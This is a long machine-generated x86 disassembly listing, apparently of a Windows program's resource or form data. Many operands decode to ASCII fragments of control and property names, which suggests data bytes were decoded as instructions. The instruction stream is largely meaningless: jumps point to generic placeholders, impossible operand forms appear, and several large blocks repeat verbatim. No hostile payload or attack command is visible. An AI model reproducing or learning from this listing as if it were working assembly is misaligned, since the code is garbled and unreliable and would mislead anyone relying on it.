0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
outsb
je r-xdata
push 0x65
insb
je r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebx
outsd
or edx [ gs : ebx + edx * 2 + 0x63 ]
arpl [ gs : eax + eax + 0xa ] si
push eax
popad
inc esp
outsd
ja r-xdata
push eax
outsd
jae r-xdata
inc esp
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
adc [ eax ] al
sub al 0x2c
inc ebx
add [ eax + edx ] bh
dec ecx
outsb
je r-xdata
or esi [ ebx + 0x63 ]
inc ebp
outsb
push ebx
jae r-xdata
inc ebx
insb
or [ ebx + 0x63 ] dh
nop
xor [ ebx + eax * 2 ] ch
add [ ebx ] al
or edx [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add al bh
xchg [ ebx ] al
pop ebx
add [ eax ] al
add ah dl
ja r-xdata
aam 0x77
inc ebx
add [ eax + 0x70004418 ] al
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add eax 0x52100044
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
inc ebx
outsd
add [ gs : ecx ] ecx
push ebx
outsd
outsb
pop es
jae r-xdata
jb r-xdata
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ edx + esi * 2 ] dh
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
jb r-xdata
outsd
jae r-xdata
inc edx
outsd
je r-xdata
inc eax
add [ ebp + ebp + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp + 0x43 ] dl
outsd
insd
add [ ebx ] bl
add bh bh
fcom st3
inc ebx
add [ ecx ] al
add [ eax ] al
add ah bh
ja r-xdata
add [ eax + 0x76 ] ch
inc ebx
add [ esi + esi * 2 + 0x540a0043 ] cl
push 0x8c004376
jbe r-xdata
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ esi ] al
add [ edi * 4 - 0x42c842eb ] dl
adc al 0x0
mov bl 0xff
mov dl 0xff
les esi [ edi + 0x43 ]
add ah cl
ja r-xdata
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
add [ edx ] cl
arpl [ eax + eax + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
insb
push esp
jb r-xdata
hlt
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_4372a7
add [ eax ] al
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add ah ch
jb r-xdata
inc eax
add [ esi + ebp + 0x43 ] dl
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edx ] cl
push esp
arpl [ ebx + 0x5 ] bp
dec [ esp + esi * 2 + 0x43 ]
jae r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
insb
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
inc ebx
push 0x65676e61
cmp al 0x10
inc eax
add [ edx + eax ] dl
add bh bh
push esp
add bh bh
dec esp
je r-xdata
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
jb r-xdata
sub eax 0xa1a00043
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
pushad
add [ eax ] al
[ eax + eax ]
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ eax + 0x61 ] dl
push ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305000f ] al
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
mov es [ ebx ]
je r-xdata
inc edx
inc ebx
je r-xdata
imul edi [ edx + 0x65 ] r-xdata
push ebx
adc [ eax ] al
adc [ edx ] al
add bh bh
cmp al 0x76
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] al
dec ebp
imul ebp [ esi + 0x3c ] 0x18004010
add al [ eax ]
jmp esp
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax - 0x7a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000e ] al
outsd
outsb
jae r-xdata
add eax [ eax + eax + 0x1 ]
insb
jae r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
add [ eax ] al
[ eax ]
rol [ ebx ] cl
mov ah 0xd2
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sub_4324e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
and eax 0x26160043
inc ebx
add [ edx + eax ] dl
add [ eax ] al
pushfd
sbb al 0x43
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
add eax 0x52100044
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ edi + ebp * 2 ] al
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
inc esp
add [ edi + eax * 2 ] cl
add [ eax - 0x21 ] bl
inc ebx
add [ eax + 0x4c00436a ] ah
add al [ eax + eax + 0x2c ]
inc ebp
inc esp
add al ch
inc ebp
inc esp
add ah ah
inc eax
inc esp
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add ah dh
jo r-xdata
xor [ ecx + 0x43 ] 0x0
add al 0x72
inc ebx
add [ edi + ebp * 2 + 0x43 ] ch
add [ eax + 0x4c004418 ] al
jno r-xdata
push [ eax ]
add dh bh
call sub_436aa2
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc865646f
lea eax [ ebx ]
insb
jae r-xdata
add [ esp + edx * 2 ] cl
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
sub [ esi ] ah
inc ebx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
sub al 0x25
inc ebx
add ah ah
sbb eax 0x350043
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
insb
outsd
inc ebx
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ edi + ebp * 2 + 0x43 ] ah
add [ eax + 0x70 ] ch
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x78ff
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
cwde
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] ah
and eax 0x3c0041
add dh bh
cmp dl dl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
insb
cmovno eax [ eax ]
adc [ edx ] al
add bh bh
and al 0x43
add [ eax ] al
add [ eax ] al
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
mov es [ ebx ]
je r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax - 0x7a ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
dec [ eax + 0x10043e0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
push ebx
lea eax [ ebx ]
xchg esp eax
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jae r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001e ] al
aad 0x44
add [ eax + eax ] bh
in al 0xdd
inc ebx
add [ edi + edi * 8 + 0x43 ] cl
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
mov ah 0x6b
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x38ff0000 0x43e0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
push cs
push eax
popad
je r-xdata
outsb
je r-xdata
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add bh bh
mov eax 0xc80043df
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ecx + ecx * 2 ]
outsb
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec eax
inc esp
add [ ecx + ecx * 2 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
test eax 0x68ff0001
dec eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add al 0x46
outsd
outsb
je r-xdata
add [ eax ] al
sbb [ eax ] 0x0
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax ]
inc ebx
add ah bl
fild [ ebx ]
add [ eax ] al
dec ebx
jns r-xdata
fcom [ bx + si ]
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] al
rol [ ecx ] 0x0
jo r-xdata
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx ] cl
add al [ eax ]
push [ ebx + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
lodsb [ esi ]
inc [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ edx ] cl
dec edi
nop
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
loopne r-xdata
jo r-xdata
pop [ ebx ]
lodsb [ esi ]
nop
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
adc [ ecx ] al
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
sbb [ edx + 0x1080043 ] dl
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
outsb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
pop [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x18 ] bp
xchg edx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
jo r-xdata
outsb
push ebp
jo r-xdata
push ebp
jo r-xdata
arpl [ ebx - 0x30 ] bp
xchg ecx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
inc esp
outsd
ja r-xdata
jb r-xdata
insb
insb
inc ebx
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ esp + ebp ] ch
inc ebx
add [ eax ] cl
jae r-xdata
outsb
push ebx
je r-xdata
dec edi
test [ edi + 0xe00043 ] cl
add bh bh
add [ eax ] al
jmp eax
pushad
nop
inc ebx
add al ch
add [ eax ] eax
das
add [ edi ] al
dec edi
nop
inc ebx
add al bl
add [ eax ] eax
outsb
add [ ecx ] cl
dec edi
xchg edx eax
inc ebx
add [ eax ] cl
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9422a38
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
adc [ ecx ] al
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
or [ ebx + 0x63 ] dh
push eax
popad
jae r-xdata
outsd
jbe r-xdata
xchg ebx eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
jae r-xdata
jb r-xdata
cld
add [ eax ] al
add [ eax ] al
push esp
jae r-xdata
or [ esp + edx * 2 ] cl
dec esp
imul ebp [ esi + 0x65 ] 0x730a7055
arpl [ ecx + ebp * 2 + 0x6e ] cx
inc esp
outsd
ja r-xdata
or dh [ ebx + 0x63 ]
jae r-xdata
inc ebp
jbe r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x6e776f44
push ebp
jo r-xdata
arpl [ eax + 0x61 ] dx
jb r-xdata
arpl [ edx + 0x6f ] si
insb
insb
push eax
push esp
outsd
jo r-xdata
arpl [ edx + 0x6f ] si
insb
insb
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc esp
jb r-xdata
inc esp
add [ edi + eax * 2 ] cl
add [ eax - 0x21 ] bl
inc ebx
add [ ecx ] cl
inc esp
add [ edx + eax + 0x44 ] cl
add [ eax * 2 + 0x45e80044 ] ch
inc esp
add ah ah
inc eax
inc esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc eax
add [ eax + 0x800432c ] dh
or al 0x54
add [ eax ] al
add [ esi + ebp ] bl
inc ebx
add [ edx + 0x2e ] al
inc ebx
add [ eax ] bh
add al [ eax ]
add ah ch
popfd
inc ebx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ eax + 0x22 ] dh
inc esp
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
dec eax
outsb
je r-xdata
push 0x65
insb
je r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc ebx
outsd
or edx [ gs : ebx + edx * 2 + 0x63 ]
arpl [ gs : eax + eax + 0xa ] si
push eax
popad
inc esp
outsd
ja r-xdata
push eax
outsd
jae r-xdata
inc esp
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
adc [ eax ] al
sub al 0x2c
inc ebx
add [ eax + edx ] bh
dec ecx
outsb
je r-xdata
or esi [ ebx + 0x63 ]
inc ebp
outsb
push ebx
jae r-xdata
inc ebx
insb
or [ ebx + 0x63 ] dh
nop
xor [ ebx + eax * 2 ] ch
add [ ebx ] al
or edx [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add al bh
xchg [ ebx ] al
pop ebx
add [ eax ] al
add ah dl
ja r-xdata
aam 0x77
inc ebx
add [ eax + 0x70004418 ] al
jae r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add eax 0x52100044
inc esp
add [ eax ] bh
sbb al [ eax + eax - 0x7c ]
inc ebx
outsd
add [ gs : ecx ] ecx
push ebx
outsd
outsb
pop es
jae r-xdata
jb r-xdata
aas
inc ecx
add ah cl
inc [ ebx ]
xchg esp eax
rol [ ebx ] cl
in al dx
push es
inc esp
add [ esp + ebx * 8 - 0x64f7ffbd ] ch
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ edx + esi * 2 ] dh
inc ebx
add [ ecx * 2 + 0x52400044 ] ah
inc esp
add [ ecx + edx * 2 - 0x2df7ffbc ] cl
inc ebx
add [ eax - 0x3fffbbb9 ] ah
inc edi
inc esp
add al bl
inc esp
inc esp
add [ eax - 0x2f ] dl
inc ebx
add [ ecx + edx * 8 + 0x43 ] dl
add [ ecx + eax + 0x1c80044 ] bl
inc esp
add [ esp + ebx * 8 - 0x2d33ffbd ] dl
inc ebx
add [ eax ] ah
fiadd [ ebx ]
cwde
fld [ ebx ]
lodsb [ esi ]
loopne r-xdata
jb r-xdata
outsd
jae r-xdata
inc edx
outsd
je r-xdata
inc eax
add [ ebp + ebp + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp + 0x43 ] dl
outsd
insd
add [ ebx ] bl
add bh bh
fcom st3
inc ebx
add [ ecx ] al
add [ eax ] al
add ah bh
ja r-xdata
add [ eax + 0x76 ] ch
inc ebx
add [ esi + esi * 2 + 0x540a0043 ] cl
push 0x8c004376
jbe r-xdata
inc esp
add ah bl
and al 0x44
add [ eax ] al
pop ecx
inc esp
add [ eax + 0x78004443 ] cl
inc esi
inc esp
add [ esi ] al
add [ edi * 4 - 0x42c842eb ] dl
adc al 0x0
mov bl 0xff
mov dl 0xff
les esi [ edi + 0x43 ]
add ah cl
ja r-xdata
add [ eax ] dh
sbb al 0x44
add [ esp + ebx ] dh
inc esp
add ah ch
sbb al [ eax + eax - 0x6c ]
sbb al [ eax + eax + 0xc ]
inc edi
add [ edx ] cl
arpl [ eax + eax + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
insb
push esp
jb r-xdata
hlt
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
xchg esp eax
cmovno eax [ eax ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
call sub_4372a7
add [ eax ] al
add ah cl
inc ebp
inc esp
add [ edi + eax + 0x44 ] ah
add al bh
or eax 0x1b980044
inc esp
add ah ch
jb r-xdata
inc eax
add [ esi + ebp + 0x43 ] dl
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
and [ esi + 0x610043 ] cl
add bh bh
sbb dl dl
inc ebx
add [ edx + edx * 8 + 0x43 ] dh
add [ eax + 0x3 ] al
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edx ] cl
push esp
arpl [ ebx + 0x5 ] bp
dec [ esp + esi * 2 + 0x43 ]
jae r-xdata
add bh bh
in al 0x3
inc esp
add [ ecx ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
insb
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
inc ebx
push 0x65676e61
cmp al 0x10
inc eax
add [ edx + eax ] dl
add bh bh
push esp
add bh bh
dec esp
je r-xdata
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
jb r-xdata
sub eax 0xa1a00043
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
pushad
add [ eax ] al
[ eax + eax ]
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ eax + 0x61 ] dl
push ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
push ss
add [ ebx ] al
dec ebp
popad
js r-xdata
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x4b
imul ebp [ esi + 0x64 ] r-xdata
and al [ edx ]
add bh bh
and al [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc eax 0x614c0b00
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
lea eax [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x38ff0001 ] ah
dec eax
